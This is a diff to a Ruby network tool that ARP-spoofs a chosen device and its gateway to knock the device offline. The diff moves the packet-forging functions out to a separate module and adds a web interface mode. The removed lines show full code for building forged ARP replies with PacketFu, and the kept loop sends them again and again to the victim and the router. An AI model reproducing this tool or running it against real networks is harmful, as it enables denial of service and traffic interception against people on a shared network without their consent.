@@ -1,6 +1,10 @@
 #!/usr/bin/env ruby
-require "rubygems"
+require 'rubygems' if RUBY_VERSION < "1.9"
 require "bundler/setup"
+
+# Local-wide modules
+require_relative "src/poison.rb"
+require_relative "src/web.rb"
 
 # System gems
 require 'optparse'
@@ -14,50 +18,6 @@ require 'ipscanner'
 # Others
 require 'terminal-table'
 require 'colorize'
-
-# Send a standard ARP packet from source (you) to destination (victim)
-def poison_victim(iface, mac, gateway_ip, address, address_mac)
-  # Create a ARP packet sent to victim
-  arp_packet = PacketFu::ARPPacket.new
-  arp_packet.eth_saddr = mac
-  arp_packet.eth_daddr = address_mac
-
-  arp_packet.arp_saddr_mac = mac
-  arp_packet.arp_daddr_mac = address_mac
-  arp_packet.arp_saddr_ip = gateway_ip
-  arp_packet.arp_daddr_ip = address
-  arp_packet.arp_opcode = 2  
-  arp_packet.to_w(iface)  
-end
-
-# Send a malformed ARP packet from source to bad router address
-def poison_router(iface, mac, gateway_ip, gateway_mac, address)
-  arp_packet_router = PacketFu::ARPPacket.new
-  arp_packet_router.eth_saddr = mac        
-  arp_packet_router.eth_daddr = '12:34:56:78:9A:BC'          
-  
-  arp_packet_router.arp_saddr_mac = mac    
-  arp_packet_router.arp_daddr_mac = '12:34:56:78:9A:BC'     
-  arp_packet_router.arp_saddr_ip = address        
-  arp_packet_router.arp_daddr_ip = gateway_ip        
-  arp_packet_router.arp_opcode = 2 
-  arp_packet_router.to_w(iface)       
-            
-end
-
-# safely kill program by sending conventional packet with correct source and destination
-def restore(iface, mac, gateway_ip, gateway_mac, address)
-  arp_restore = PacketFu::ARPPacket.new
-  arp_restore.eth_saddr = mac        
-  arp_restore.eth_daddr = gateway_mac         
-  
-  arp_restore.arp_saddr_mac = mac    
-  arp_restore.arp_daddr_mac = gateway_mac    
-  arp_restore.arp_saddr_ip = address        
-  arp_restore.arp_daddr_ip = gateway_ip        
-  arp_restore.arp_opcode = 2 
-  arp_restore.to_w(iface)   
-end
 
 
 # Create a OpenStruct for option parsing
@@ -82,6 +42,7 @@ OptionParser.new do |opt|
 
   opt.on('-i IFACE', "--interface IFACE", "Input network interface, otherwise defaults") { |o| options.iface = o}
   opt.on('-a ADDRESS', "--address ADDRESS", "Input target address, otherwise prints host table"){ |o| options.address = o}
+  opt.on('-m MODE', "--mode MODE", "Input mode to start, web or cli") { |o| options.mode = o}
 
   opt.on_tail("-h", "--help", "Show this message") do
     puts opt
@@ -112,10 +73,21 @@ gateway_mac = PacketFu::Utils.arp(gateway_ip, :iface => iface)
 
 config = PacketFu::Utils.ifconfig(iface)
 
+if( options.mode == "web" ) 
+  ByeApp.set :iface => iface, :mac => mac, :gateway_ip => gateway_ip, :gateway_mac => gateway_mac
+  ByeApp.run!
+  exit
+elsif( options.mode == "cli" )
+  # Continue execution
+else
+  raise "No service provided! Please specify web or cli service to get started.".colorize(:red)
+end
+
 # create a global array for terminal-table
 $rows = []
 # create a global variable for address option, even if none is provided
 $address = options.address || nil
+
 
 puts "Interface: #{iface} \nLocal Area IP: #{ip}\nMAC: #{mac}\n\nGateway IP: #{gateway_ip}Gateway MAC: #{gateway_mac}\n"
 sleep 3
@@ -141,16 +113,12 @@ if ( $address == nil )
     
 end
 
-# Grab MAC Address of Victim
-$address_mac = PacketFu::Utils.arp($address, :iface => iface) 
-
-
 while true
   begin
     sleep 1
     puts "Deauthenticating... #{$address}"
     
-    poison_victim(iface, mac, gateway_ip, $address, $address_mac)
+    poison_victim(iface, mac, gateway_ip, $address)
     poison_router(iface, mac, gateway_ip, gateway_mac, $address)
     
   rescue Interrupt
